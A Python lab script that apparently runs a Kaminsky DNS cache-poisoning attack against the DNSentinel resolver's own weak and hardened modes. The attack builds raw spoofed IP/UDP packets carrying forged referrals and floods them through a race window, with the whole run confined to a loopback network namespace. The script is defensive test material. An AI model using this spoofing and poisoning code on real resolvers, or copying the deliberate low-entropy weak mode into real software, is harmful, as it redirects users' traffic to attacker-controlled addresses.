#!/usr/bin/env python3
"""Kaminsky cache-poisoning attack against DNSentinel, for the defence ladder
(plan §5.10, experiment E5).

The attack races *forged* delegation referrals against the real one. When the
resolver asks the lab TLD "where is <random>.target.lab?", the real TLD is
slow to answer; meanwhile the attacker floods responses spoofed from the TLD's
address that re-delegate `target.lab` to its own name server. If one forged
packet matches the resolver's query (transaction ID, source port, question)
before the real answer arrives, the resolver caches the attacker's name server
for the whole zone, and `www.target.lab` then resolves to the attacker's
address (6.6.6.6).

How hard that is depends only on the resolver's anti-spoofing, which is the
point. The defence levels map to the resolver's config:

    weak   : low-entropy transaction IDs on a known fixed source port
             (plan §5.10 weak mode). A few hundred forged packets poison it.
    hardened: a full 16-bit random ID on a random source port. The same flood
             has a vanishing chance of matching, so it fails.

Everything runs in a private user+network namespace (`unshare -rn`), against
*our own* resolver and *our own* fake servers on loopback. Nothing leaves the
machine, and the forged source addresses are lab addresses. It needs the
resolver built with weak mode:

    cmake -S . -B build-weak -DDNSENTINEL_WEAK_MODE=ON && cmake --build build-weak -j
    python3 lab/attacks/kaminsky.py build-weak/dnsentinel            # weak vs hardened
    python3 lab/attacks/kaminsky.py build-weak/dnsentinel --level weak --budget 2000

Exit status: 0 if every level matched its expected outcome, 1 if not, 77 if
the lab can't run here (no user namespaces). This is the same crafting Scapy
would do; it uses raw sockets directly so it needs no extra packages and can
flood fast enough to be worth measuring.

> Only ever run against your own resolver and servers, in the lab. Never
> against a resolver or domain you do not own.
"""

import argparse
import os
import shutil
import signal
import socket
import struct
import subprocess
import sys
import threading
import time

IN_NETNS = "DNSENTINEL_KAMINSKY_IN_NETNS"
SKIP = 77

A, NS = 1, 2
CLASS_IN = 1
NOERROR, NXDOMAIN = 0, 3

RESOLVER = ("127.0.0.1", 5355)
ROOT_IP, TLD_IP, REAL_IP, EVIL_IP = "127.0.0.2", "127.0.0.3", "127.0.0.4", "127.0.0.66"
REAL_ADDR, EVIL_ADDR = "192.0.2.80", "6.6.6.6"

# The real TLD waits this long before sending the genuine referral, which is
# the window the attacker floods into. Real resolvers give an off-path
# attacker a much smaller window; we widen it so the demo is quick, exactly as
# shrinking the ID space does. Neither changes who wins at a given entropy.
TLD_DELAY = 0.6

# ─── Wire format ─────────────────────────────────────────────────────────────


def encode_name(name):
    return b"".join(bytes([len(l)]) + l.encode() for l in name.split(".") if l) + b"\0"


def encode_rr(name, rtype, rdata, ttl=300):
    return encode_name(name) + struct.pack(">HHIH", rtype, CLASS_IN, ttl, len(rdata)) + rdata


def read_name(buf, off):
    labels, resume = [], None
    for _ in range(128):
        n = buf[off]
        if n & 0xC0 == 0xC0:
            resume = off + 2 if resume is None else resume
            off = ((n & 0x3F) << 8) | buf[off + 1]
        elif n == 0:
            return ".".join(labels), (off + 1 if resume is None else resume)
        else:
            labels.append(buf[off + 1 : off + 1 + n].decode("ascii", "replace").lower())
            off += 1 + n
    raise ValueError("name too long")


def parse_question(buf):
    qid = struct.unpack(">H", buf[:2])[0]
    name, off = read_name(buf, 12)
    qtype = struct.unpack(">H", buf[off : off + 2])[0]
    return qid, name, qtype, buf[12 : off + 4]  # the question (name + qtype + qclass), byte for byte


def build_referral(qid, qname_wire, zone, ns_name, ns_ip, aa=False):
    """A response delegating `zone` to `ns_name` (glued to `ns_ip`)."""
    flags = 0x8000 | (0x0400 if aa else 0)
    header = struct.pack(">HHHHHH", qid, flags, 1, 0, 1, 1)
    authority = encode_rr(zone, NS, encode_name(ns_name), 3600)
    additional = encode_rr(ns_name, A, socket.inet_aton(ns_ip), 3600)
    return header + qname_wire + authority + additional


def build_answer(qid, qname_wire, name, ip):
    header = struct.pack(">HHHHHH", qid, 0x8400, 1, 1, 0, 0)  # aa
    return header + qname_wire + encode_rr(name, A, socket.inet_aton(ip))


def build_nxdomain(qid, qname_wire, zone):
    header = struct.pack(">HHHHHH", qid, 0x8403, 1, 0, 1, 0)  # aa, NXDOMAIN
    soa = encode_name(zone) + encode_name("ns." + zone) + encode_name("root." + zone)
    soa += struct.pack(">IIIII", 1, 3600, 600, 86400, 60)
    return header + qname_wire + encode_rr(zone, 6, soa, 60)


def under(name, zone):
    return name == zone or name.endswith("." + zone)


# ─── The lab servers ─────────────────────────────────────────────────────────


class Server(threading.Thread):
    """A fake authoritative server on one loopback address, port 53."""

    def __init__(self, ip, handler, delay=0.0):
        super().__init__(daemon=True)
        self.handler, self.delay = handler, delay
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((ip, 53))
        self.stop = False

    def run(self):
        self.sock.settimeout(0.2)
        while not self.stop:
            try:
                data, peer = self.sock.recvfrom(4096)
            except socket.timeout:
                continue
            try:
                qid, name, qtype, qwire = parse_question(data)
            except (IndexError, struct.error, ValueError):
                continue
            reply = self.handler(qid, name, qtype, qwire)
            if reply is None:
                continue
            if self.delay:
                threading.Timer(self.delay, self.sock.sendto, (reply, peer)).start()
            else:
                self.sock.sendto(reply, peer)


def start_lab():
    """Root, slow TLD, the real target server, and the attacker's server."""
    servers = []

    def root(qid, name, qtype, qwire):
        if under(name, "lab"):
            return build_referral(qid, qwire, "lab", "ns.lab", TLD_IP)
        if name in ("", "."):  # priming: the root's own NS set, authoritatively
            header = struct.pack(">HHHHHH", qid, 0x8400, 1, 1, 0, 1)
            return header + qwire + encode_rr(".", NS, encode_name("a.root-servers"), 3600) + \
                encode_rr("a.root-servers", A, socket.inet_aton(ROOT_IP), 3600)
        if name == "a.root-servers":  # the root's nameserver address
            return build_answer(qid, qwire, name, ROOT_IP)
        return build_nxdomain(qid, qwire, ".")

    def tld(qid, name, qtype, qwire):  # slow: the real referral the attack races
        return build_referral(qid, qwire, "target.lab", "ns.target.lab", REAL_IP)

    def real(qid, name, qtype, qwire):
        if name == "www.target.lab":
            return build_answer(qid, qwire, name, REAL_ADDR)
        return build_nxdomain(qid, qwire, "target.lab")

    def evil(qid, name, qtype, qwire):  # whatever the resolver asks, evil owns the zone now
        if name == "www.target.lab":
            return build_answer(qid, qwire, name, EVIL_ADDR)
        return build_nxdomain(qid, qwire, "target.lab")

    servers.append(Server(ROOT_IP, root))
    servers.append(Server(TLD_IP, tld, delay=TLD_DELAY))
    servers.append(Server(REAL_IP, real))
    servers.append(Server(EVIL_IP, evil))
    for s in servers:
        s.start()
    return servers


# ─── The resolver under attack ───────────────────────────────────────────────


def write_config(tmp, level):
    hints = os.path.join(tmp, "lab.root")
    with open(hints, "w") as f:
        f.write(f".  NS  a.root-servers.\na.root-servers.  A  {ROOT_IP}\n")
    path = os.path.join(tmp, f"{level}.yaml")
    with open(path, "w") as f:
        f.write(f'listen:\n  udp: "{RESOLVER[0]}:{RESOLVER[1]}"\n')
        f.write(f"resolver:\n  root_hints: {hints}\n  overall_deadline_ms: 4000\n")
        f.write("  spoof_tcp_threshold: 0\n")  # don't flip to TCP: we are measuring the UDP race
        if level == "weak":
            # Below rung L3 of the ladder: low-entropy ID on a known port, and
            # no 0x20, so the attacker can match the query it is racing.
            f.write("  use_0x20: false\n")
            f.write("  weak_mode:\n    txid_bits: 8\n    fixed_source_port: 34567\n")
    return path


class Resolver:
    def __init__(self, binary, config):
        self.proc = subprocess.Popen([binary, "-c", config], stderr=subprocess.PIPE, text=True)
        self.ready = False
        threading.Thread(target=self._wait_ready, daemon=True).start()

    def _wait_ready(self):
        for line in self.proc.stderr:
            if "listening on udp" in line:
                self.ready = True
            if self.proc.poll() is not None:
                break

    def wait_until_ready(self, timeout=5):
        end = time.monotonic() + timeout
        while not self.ready and time.monotonic() < end and self.proc.poll() is None:
            time.sleep(0.02)
        return self.ready

    def stop(self):
        self.proc.send_signal(signal.SIGINT)
        try:
            self.proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            self.proc.kill()


def ask(qname, timeout=4):
    """Resolve `qname` through the resolver; return its A address or None."""
    qid = struct.unpack(">H", os.urandom(2))[0]
    query = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0) + encode_name(qname) + struct.pack(">HH", A, CLASS_IN)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)
        sock.sendto(query, RESOLVER)
        try:
            data = sock.recv(4096)
        except socket.timeout:
            return None
    ancount = struct.unpack(">H", data[6:8])[0]
    _, off = read_name(data, 12)
    off += 4  # qtype + qclass
    for _ in range(ancount):
        _, off = read_name(data, off)
        rtype, _, _, rdlen = struct.unpack(">HHIH", data[off : off + 10])
        off += 10
        if rtype == A:
            return socket.inet_ntoa(data[off : off + rdlen])
        off += rdlen
    return None


# ─── The attacker ────────────────────────────────────────────────────────────


def udp_checksum_zero():
    return 0  # IPv4 permits a zero UDP checksum; skips having to compute it


def forged_referral_packet(src_ip, dst_ip, dst_port, qid, qname):
    """A raw IP+UDP datagram spoofed from the TLD, re-delegating target.lab to
    the attacker's name server. `qname` is the exact question being raced."""
    payload = build_referral(qid, encode_name(qname) + struct.pack(">HH", A, CLASS_IN),
                             "target.lab", "ns.evil.lab", EVIL_IP)
    udp = struct.pack(">HHHH", 53, dst_port, 8 + len(payload), udp_checksum_zero()) + payload
    total = 20 + len(udp)
    ip = struct.pack(">BBHHHBBH4s4s", 0x45, 0, total, 0, 0, 64, socket.IPPROTO_UDP, 0,
                     socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    return ip + udp


def attack(level, budget):
    """One poisoning attempt against a freshly started resolver. Returns
    (poisoned, forged_packets_sent)."""
    import random

    raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # The (source port, transaction ID) pairs to try. At the weak level the
    # port is fixed and known and the ID is only 8 bits, so one pass of the
    # 256 IDs is certain to include the right one. Hardened leaves the
    # attacker guessing both blindly against a full 16-bit ID on a random
    # port, so it just fires `budget` random guesses into the same window.
    if level == "weak":
        guesses = [(34567, qid) for qid in range(256)]
    else:
        guesses = [(random.randint(1024, 65535), random.randint(0, 65535)) for _ in range(budget)]

    victim = f"x{os.getpid()}{int(time.time() * 1000) % 100000}.target.lab"

    # Fire the trigger query in the background; it makes the resolver ask the
    # (slow) TLD, opening the race window.
    threading.Thread(target=ask, args=(victim,), daemon=True).start()
    time.sleep(0.05)  # let the resolver reach the TLD

    sent = 0
    deadline = time.monotonic() + TLD_DELAY + 0.3
    for port, qid in guesses:
        if time.monotonic() >= deadline or sent >= budget:
            break
        raw.sendto(forged_referral_packet(TLD_IP, RESOLVER[0], port, qid, victim), (RESOLVER[0], 0))
        sent += 1
    raw.close()

    time.sleep(TLD_DELAY + 0.4)  # let resolution settle
    poisoned = ask("www.target.lab") == EVIL_ADDR
    return poisoned, sent


# ─── Driver ──────────────────────────────────────────────────────────────────


def run_level(binary, tmp, level, budget):
    config = write_config(tmp, level)
    resolver = Resolver(binary, config)
    if not resolver.wait_until_ready():
        print(f"  {level}: resolver did not start", file=sys.stderr)
        return None
    ask("www.example-warmup.lab")  # prime the root once, cheaply
    try:
        poisoned, sent = attack(level, budget)
    finally:
        resolver.stop()
    print(f"  {level:9s}: {'POISONED' if poisoned else 'resisted'} after {sent} forged packets")
    return poisoned


def reexec_in_netns():
    unshare = ["unshare", "--user", "--map-root-user", "--net"]
    if not shutil.which("unshare") or not shutil.which("ip"):
        print("skipped: needs unshare(1) and ip(8)")
        return SKIP
    if subprocess.run(unshare + ["true"], capture_output=True).returncode != 0:
        print("skipped: unprivileged user namespaces are disabled here")
        return SKIP
    env = dict(os.environ, **{IN_NETNS: "1"})
    return subprocess.run(unshare + [sys.executable, os.path.abspath(__file__), *sys.argv[1:]], env=env).returncode


def main():
    ap = argparse.ArgumentParser(description="Kaminsky poisoning against DNSentinel (lab only).")
    ap.add_argument("binary", help="path to a dnsentinel built with -DDNSENTINEL_WEAK_MODE=ON")
    ap.add_argument("--level", choices=["weak", "hardened"], help="run one level (default: both)")
    ap.add_argument("--budget", type=int, default=5000, help="max forged packets per attempt")
    args = ap.parse_args()

    binary = os.path.abspath(args.binary)
    if not os.access(binary, os.X_OK):
        print(f"{binary}: not executable (build it first)", file=sys.stderr)
        return 2
    if os.environ.get(IN_NETNS) != "1":
        return reexec_in_netns()

    subprocess.run(["ip", "link", "set", "lo", "up"], check=True)
    start_lab()
    time.sleep(0.2)

    import tempfile

    levels = [args.level] if args.level else ["weak", "hardened"]
    expected = {"weak": True, "hardened": False}
    ok = True
    print("Kaminsky poisoning, defence ladder (expected: weak poisoned, hardened resists):")
    with tempfile.TemporaryDirectory() as tmp:
        for level in levels:
            poisoned = run_level(binary, tmp, level, args.budget)
            if poisoned is None or poisoned != expected[level]:
                ok = False
    print("\nall levels as expected" if ok else "\nUNEXPECTED outcome")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
